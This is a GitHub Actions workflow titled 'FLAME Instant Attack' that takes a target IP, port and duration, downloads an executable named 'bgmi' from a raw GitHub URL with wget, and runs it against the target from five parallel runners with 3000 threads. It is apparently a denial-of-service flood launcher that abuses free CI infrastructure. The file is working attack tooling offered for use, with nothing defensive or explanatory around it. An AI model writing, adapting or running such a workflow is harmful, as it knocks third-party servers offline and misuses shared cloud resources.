name: 🔥 FLAME Instant Attack
on: 
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP Address'
        required: true
        type: string
      target_port: 
        description: 'Target Port'
        required: true
        type: string
      attack_duration:
        description: 'Attack Duration (seconds)'
        required: true
        type: string

permissions:
  contents: write

jobs:
  fire:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        instance: [1, 2, 3, 4, 5]
    steps:
      - name: 🚀 Ultra-Fast Binary Download
        run: |
          wget -q "https://raw.githubusercontent.com/flamedimdos-a11y/2/main/bgmi" -O bgmi
          chmod +x bgmi
          echo "✅ Binary 'bgmi' downloaded successfully"
          
      - name: 💥 Execute Attack
        timeout-minutes: 10
        continue-on-error: true
        run: |
          echo "🎯 Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
          echo "⏰ Duration: ${{ inputs.attack_duration }} seconds"
          echo "🔢 Instance: ${{ matrix.instance }}"
          echo "🔥 Executing: ./bgmi ${{ inputs.target_ip }} ${{ inputs.target_port }} ${{ inputs.attack_duration }} 3000"
          ./bgmi "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.attack_duration }}" 3000
          echo "✅ Attack completed on instance ${{ matrix.instance }}"
